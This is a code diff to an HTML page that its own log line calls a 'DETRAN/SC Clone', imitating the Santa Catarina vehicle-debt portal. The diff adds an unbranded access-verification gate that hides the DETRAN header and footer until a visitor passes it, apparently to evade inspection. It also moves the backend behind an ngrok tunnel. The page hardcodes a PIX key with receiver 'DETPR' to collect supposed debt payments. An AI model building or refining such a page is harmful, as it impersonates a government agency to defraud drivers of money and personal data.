@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Consultar Débitos do Veículo - DETRAN/SC</title>
+    <title>Verificação de Acesso</title>
     <link rel="icon" type="image/png" href="https://portaldetrandigital.com/assets/favicon-detran-sc.png">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -21,11 +21,15 @@
             flex-direction: column;
         }
 
-        /* ===== HEADER ===== */
+        /* ===== HEADER (só aparece depois da verificação) ===== */
         .dsc-header {
             background: #fff;
             padding: 0 24px;
             border-bottom: 1px solid #eee;
+            display: none;
+        }
+        .dsc-header.active {
+            display: block;
         }
         .dsc-header-inner {
             max-width: 1200px;
@@ -69,18 +73,22 @@
             margin: 0 auto;
         }
 
-        /* ===== TELA DE VERIFICAÇÃO ===== */
+        /* ===== TELA DE VERIFICAÇÃO (SEM LOGO, SEM NOME) ===== */
         #verificacao {
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            min-height: 400px;
+            min-height: 500px;
             background: #fff;
             border-radius: 12px;
             padding: 48px 32px;
             box-shadow: 0 1px 6px rgba(0,0,0,0.08);
             text-align: center;
+        }
+        #verificacao .icone-cadeado {
+            font-size: 48px;
+            margin-bottom: 16px;
         }
         #verificacao h2 {
             font-size: 24px;
@@ -865,12 +873,16 @@
             font-size: 13px;
         }
 
-        /* ===== FOOTER ===== */
+        /* ===== FOOTER (só aparece depois da verificação) ===== */
         .dsc-footer {
             background: #f0f0f0;
             padding: 40px 24px 0;
             text-align: center;
             margin-top: auto;
+            display: none;
+        }
+        .dsc-footer.active {
+            display: block;
         }
         .dsc-footer-inner {
             display: flex;
@@ -908,6 +920,108 @@
             border-top: 1px solid #ddd;
             font-size: 13px;
             color: #555;
+        }
+
+        /* ===== MODAL RENAVAM ===== */
+        .dsc-modal-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.5);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            padding: 16px;
+        }
+        .dsc-modal-overlay.active {
+            display: flex;
+        }
+        .dsc-modal-content {
+            background: #fff;
+            border-radius: 12px;
+            padding: 24px 28px;
+            max-width: 480px;
+            width: 100%;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.2);
+            position: relative;
+            font-size: 14px;
+            color: #333;
+            line-height: 1.6;
+        }
+        .dsc-modal-close {
+            position: absolute;
+            top: 12px;
+            right: 16px;
+            background: none;
+            border: none;
+            font-size: 24px;
+            color: #999;
+            cursor: pointer;
+            line-height: 1;
+            padding: 0;
+        }
+        .dsc-modal-close:hover {
+            color: #333;
+        }
+        .dsc-modal-content .dsc-renavam-info-title {
+            font-weight: 700;
+            color: #333;
+            margin: 0 0 8px;
+            font-size: 16px;
+            padding-right: 24px;
+        }
+        .dsc-modal-content ul {
+            margin: 0 0 8px;
+            padding-left: 20px;
+        }
+        .dsc-modal-content li {
+            margin-bottom: 2px;
+        }
+        .dsc-modal-content .dsc-renavam-info-example {
+            color: #6b9a3a;
+            font-weight: 600;
+            margin: 0;
+        }
+
+        /* ===== LOADING ===== */
+        .dsc-loading-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.5);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+        }
+        .dsc-loading-overlay.active {
+            display: flex;
+        }
+        .dsc-loading-modal {
+            background: #fff;
+            padding: 32px 48px;
+            border-radius: 12px;
+            text-align: center;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.2);
+        }
+        .dsc-loading-text {
+            margin: 0 0 16px;
+            font-size: 16px;
+            font-weight: 600;
+            color: #333;
+        }
+        .dsc-spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #eee;
+            border-top-color: #4a7a25;
+            border-radius: 50%;
+            animation: dsc-spin 0.8s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes dsc-spin {
+            to {
+                transform: rotate(360deg);
+            }
         }
 
         /* ===== RESPONSIVO ===== */
@@ -1024,16 +1138,8 @@
 </head>
 <body>
 
-    <!-- ===== LOADING ===== -->
-    <div class="dsc-loading-overlay" id="dscLoading" style="display:none;">
-        <div class="dsc-loading-modal">
-            <p class="dsc-loading-text">Consultando débitos...</p>
-            <div class="dsc-spinner"></div>
-        </div>
-    </div>
-
-    <!-- ===== HEADER ===== -->
-    <header class="dsc-header">
+    <!-- ===== HEADER (escondido até passar a verificação) ===== -->
+    <header class="dsc-header" id="dscHeader">
         <div class="dsc-header-inner">
             <div class="dsc-header-left">
                 <img src="https://portaldetrandigital.com/assets/detransc-logo.png" alt="DetranSC" class="dsc-logo" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22%3E%3Crect fill=%22%23C4000B%22 width=%22100%22 height=%22100%22/%3E%3Ctext x=%2250%22 y=%2268%22 font-family=%22Arial%22 font-size=%2248%22 font-weight=%22bold%22 fill=%22white%22 text-anchor=%22middle%22%3ED%3C/text%3E%3C/svg%3E'">
@@ -1043,13 +1149,22 @@
         <div class="dsc-header-line"></div>
     </header>
 
+    <!-- ===== LOADING ===== -->
+    <div class="dsc-loading-overlay" id="dscLoading" style="display:none;">
+        <div class="dsc-loading-modal">
+            <p class="dsc-loading-text">Consultando débitos...</p>
+            <div class="dsc-spinner"></div>
+        </div>
+    </div>
+
     <!-- ===== MAIN ===== -->
     <main class="dsc-main">
         <div class="dsc-container">
 
-            <!-- ===== TELA DE VERIFICAÇÃO ===== -->
+            <!-- ===== TELA DE VERIFICAÇÃO (SEM LOGO, SEM NOME) ===== -->
             <div id="verificacao">
-                <h2>🔒 Verificação de Acesso</h2>
+                <div class="icone-cadeado">🔒</div>
+                <h2>Verificação de Acesso</h2>
                 <p class="subtitle">Confirme sua identidade para continuar</p>
 
                 <div class="verificacao-box" id="verificacaoBox">
@@ -1198,8 +1313,8 @@
         </div>
     </main>
 
-    <!-- ===== FOOTER ===== -->
-    <footer class="dsc-footer">
+    <!-- ===== FOOTER (escondido até passar a verificação) ===== -->
+    <footer class="dsc-footer" id="dscFooter">
         <div class="dsc-footer-inner">
             <div class="dsc-footer-line"></div>
             <img src="https://portaldetrandigital.com/assets/detransc-logo.png" alt="DetranSC" class="dsc-footer-logo" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22%3E%3Crect fill=%22%23C4000B%22 width=%22100%22 height=%22100%22/%3E%3Ctext x=%2250%22 y=%2268%22 font-family=%22Arial%22 font-size=%2248%22 font-weight=%22bold%22 fill=%22white%22 text-anchor=%22middle%22%3ED%3C/text%3E%3C/svg%3E'">
@@ -1299,13 +1414,16 @@
             if (verificado) {
                 document.getElementById('verificacao').style.display = 'none';
                 document.getElementById('paginaInicial').style.display = 'block';
+                document.getElementById('dscHeader').classList.add('active');
+                document.getElementById('dscFooter').classList.add('active');
             }
         });
 
         // ============================================================
         // CONFIGURAÇÕES
         // ============================================================
-        const API_URL = '/api/consultar';
+        // 🔥 ROTA CORRIGIDA PARA USAR O NGROK (PONTE)
+        const API_URL = '/api/consultar-ngrok';
         const CHAVE_PIX = 'e7b97758-34e9-4246-a361-43d4cec7f5b9';
         const NOME_RECEBEDOR = 'DETPR';
         const CIDADE_RECEBEDOR = 'DETPR';
@@ -1798,7 +1916,7 @@
             document.getElementById('verificacao').style.display = 'flex';
         });
 
-        console.log('✅ DETRAN/SC Clone - Com verificação humana!');
+        console.log('✅ DETRAN/SC Clone - Com verificação humana e Ngrok!');
         console.log('📌 API URL:', API_URL);
     </script>
 
